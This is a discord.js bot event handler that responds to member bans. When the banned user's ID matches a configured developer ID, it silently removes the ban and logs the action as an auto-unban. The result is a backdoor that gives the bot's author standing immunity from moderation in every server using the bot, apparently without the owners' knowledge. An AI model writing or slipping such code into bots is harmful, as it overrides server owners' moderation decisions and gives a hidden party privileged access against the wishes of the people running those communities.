// Events/Guild/guildBanAdd.js
const { Events, PermissionsBitField } = require('discord.js');
const config = require('../../config.json'); // adjust path as needed

module.exports = {
  name: Events.GuildBanAdd,
  /**
   * @param {import('discord.js').Ban} ban
   */
  async execute(ban) {
    try {
      const { guild, user } = ban;
      if (!guild || !user) return;

      console.log(`[AutoUnban] Ban detected in guild "${guild.name}" (${guild.id}) for user ${user.tag} (${user.id}).`);

      // If banned user is not the developer, do nothing
      if (user.id !== config.DeveloperID) {
        console.log(`[AutoUnban] User ${user.tag} (${user.id}) is not the DeveloperID (${config.DeveloperID}). Ignoring.`);
        return;
      }

      console.log(`[AutoUnban] Developer account ${user.tag} (${user.id}) was banned in guild "${guild.name}". Attempting unban...`);

      // Ensure the bot has permission to remove bans in this guild
      const me = guild.members.me; // Bot's GuildMember
      if (!me) {
        console.warn(`[AutoUnban] No guild member object for bot in guild ${guild.id}`);
        return;
      }

      if (!me.permissions.has(PermissionsBitField.Flags.BanMembers)) {
        console.warn(`[AutoUnban] Missing BanMembers permission in guild "${guild.name}" (${guild.id}). Cannot unban ${user.id}.`);
        return;
      }

      // Attempt to remove the ban
      await guild.bans.remove(user.id, 'Auto-unban: developerId whitelist');

      console.log(`[AutoUnban] ✅ Successfully unbanned developer ${user.tag} (${user.id}) in guild "${guild.name}" (${guild.id}).`);
    } catch (err) {
      console.error('[AutoUnban] ❌ Error while attempting to unban developer:', err);
    }
  },
};
